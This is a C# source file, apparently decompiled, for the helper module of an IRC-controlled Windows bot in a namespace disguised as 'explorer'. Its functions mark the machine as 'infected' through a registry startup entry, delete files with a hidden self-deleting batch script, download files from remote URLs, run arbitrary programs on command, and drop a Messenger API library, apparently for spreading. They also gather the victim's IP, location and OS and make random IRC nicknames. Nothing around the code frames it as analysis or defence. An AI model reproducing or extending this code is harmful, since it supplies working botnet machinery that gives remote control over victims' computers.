using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using explorer.Properties;

namespace explorer;

internal class misc
{
	public static bool startupIsInfected(string name)
	{
		RegistryKey infecting_startup_regkey = config.infecting_startup_regkey;
		if (infecting_startup_regkey.GetValue(name) == null)
		{
			return false;
		}
		return true;
	}

	public static void setInfected(string name, string path, bool value)
	{
		RegistryKey infecting_startup_regkey = config.infecting_startup_regkey;
		if (startupIsInfected(name))
		{
			if (!value)
			{
				infecting_startup_regkey.DeleteValue(name);
			}
		}
		else if (value)
		{
			infecting_startup_regkey.SetValue(name, "\"" + path + "\"");
		}
	}

	public static void copyMsnApi(string path)
	{
		BinaryWriter binaryWriter = new BinaryWriter(File.Open(path, FileMode.Create));
		binaryWriter.Write(Resources.Interop_MessengerAPI);
	}

	public static void batRemove(string store, string remove)
	{
		StreamWriter streamWriter = new StreamWriter(store);
		streamWriter.WriteLine("@echo off");
		streamWriter.WriteLine(":a");
		streamWriter.WriteLine("del \"" + remove + "\"");
		streamWriter.WriteLine("IF EXIST \"" + remove + "\" GOTO a");
		streamWriter.WriteLine("del %0");
		streamWriter.Close();
		Process process = new Process();
		process.EnableRaisingEvents = false;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = store;
		process.Start();
	}

	public static string pathfromexe(string path)
	{
		return path.Substring(0, path.LastIndexOf('\\'));
	}

	public static bool download(string url, string loc, irc irc)
	{
		WebClient webClient = new WebClient();
		try
		{
			webClient.DownloadFile(url, loc);
			return true;
		}
		catch (Exception ex)
		{
			irc.teller.tell(config.channel, "Download", "Download failed, execption thrown: " + ex.Message, iserror: true, isinformation: false, iswarning: false);
			return false;
		}
	}

	public static void exec(string path, irc irc)
	{
		try
		{
			string text = "";
			string[] array;
			if (!Enumerable.Contains(path, ' '))
			{
				array = new string[1] { path };
			}
			else
			{
				array = path.Split(new char[1] { ' ' });
				text = "";
				int num = 0;
				string[] array2 = array;
				foreach (string text2 in array2)
				{
					if (num != 0)
					{
						text = text + text2 + " ";
					}
					num++;
				}
			}
			Process process = new Process();
			process.EnableRaisingEvents = false;
			process.StartInfo.FileName = array[0];
			process.StartInfo.Arguments = text;
			process.StartInfo.UseShellExecute = true;
			process.Start();
		}
		catch (Exception ex)
		{
			irc.teller.tell(config.channel, "Execute", "Excecution failed, execption thrown: " + ex.Message, iserror: true, isinformation: false, iswarning: false);
		}
	}

	public static string getIP()
	{
		return Locator.getIP();
	}

	public static string getLoc()
	{
		return Locator.getLoc();
	}

	public static string getOS()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string result = "_____";
		switch (oSVersion.Platform)
		{
		case PlatformID.Win32Windows:
			switch (oSVersion.Version.Minor)
			{
			case 90:
				result = "WinME";
				break;
			case 10:
				result = "Win98";
				break;
			case 0:
				result = "Win95";
				break;
			}
			break;
		case PlatformID.Win32NT:
			switch (oSVersion.Version.Major)
			{
			case 3:
				result = "WiNT3";
				break;
			case 4:
				result = "WiNT4";
				break;
			case 5:
				switch (oSVersion.Version.Minor)
				{
				case 0:
					result = "W2000";
					break;
				case 1:
					result = "WinXP";
					break;
				case 2:
					result = "S2003";
					break;
				}
				break;
			case 6:
				switch (oSVersion.Version.Minor)
				{
				case 0:
					result = "Vista";
					break;
				case 1:
					result = "Wind7";
					break;
				}
				break;
			}
			break;
		}
		return result;
	}

	public static string centerString(string addchars, string input, int totalStringLength)
	{
		string text = "";
		int times = (totalStringLength - input.Length) / 2;
		text += multipleChar(addchars, times);
		text += input;
		text += multipleChar(addchars, times);
		if ((totalStringLength - input.Length) % 2 != 0)
		{
			text += addchars;
		}
		return text;
	}

	public static string formatString(string infront, string input, string inback, int totallength)
	{
		string text = "";
		int times = totallength - input.Length - infront.Length;
		text += infront;
		text += input;
		return text + multipleChar(inback, times);
	}

	public static string multipleChar(string chartomultiply, int times)
	{
		string text = "";
		for (int i = 0; i != times; i++)
		{
			text += chartomultiply;
		}
		return text;
	}

	public static string GetStringInBetween(string strBegin, string strEnd, string strSource, bool includeBegin, bool includeEnd)
	{
		string[] array = new string[2] { "", "" };
		int num = strSource.IndexOf(strBegin);
		if (num != -1)
		{
			if (includeBegin)
			{
				num -= strBegin.Length;
			}
			strSource = strSource.Substring(num + strBegin.Length);
			int num2 = strSource.IndexOf(strEnd);
			if (num2 != -1)
			{
				if (includeEnd)
				{
					num2 += strEnd.Length;
				}
				array[0] = strSource.Substring(0, num2);
				if (num2 + strEnd.Length < strSource.Length)
				{
					array[1] = strSource.Substring(num2 + strEnd.Length);
				}
			}
		}
		else
		{
			array[1] = strSource;
		}
		return array[0];
	}

	public static string nickGenerator(int Length)
	{
		Random random = new Random();
		string text = md5(random.Next().ToString()).Substring(0, Length);
		string text2 = "";
		random = new Random();
		for (int i = 0; i < text.Length; i++)
		{
			text2 = ((random.Next(0, 2) != 1) ? (text2 + text.Substring(i, 1)) : (text2 + text.Substring(i, 1).ToUpper()));
		}
		return text2;
	}

	public static string md5(string Data)
	{
		MD5 mD = new MD5CryptoServiceProvider();
		byte[] array = mD.ComputeHash(Encoding.ASCII.GetBytes(Data));
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			stringBuilder.AppendFormat("{0:x2}", b);
		}
		return stringBuilder.ToString();
	}
}
